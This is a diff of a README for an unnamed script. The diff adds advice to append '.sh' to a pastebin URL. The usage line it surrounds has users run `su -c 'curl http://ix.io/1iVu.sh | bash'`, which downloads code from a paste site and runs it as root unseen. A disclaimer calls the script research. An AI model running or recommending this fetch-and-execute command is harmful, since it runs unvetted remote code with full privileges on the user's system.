@@ -7,7 +7,8 @@ However, I wanted to see if I could accomplish a similar task but without linkin
 
 ### Use:
 Simply retrieve the script and run it from the internet directly like below;  
-`su -c 'curl http://ix.io/1iVu.sh | bash'`
+`su -c 'curl http://ix.io/1iVu.sh | bash'`  
+*always append .sh to the url so it fetchs the contents as a shell script*
 
 ### Caution:
 I am not responsible for the use of this script in any way shape or form. This script was designed as research
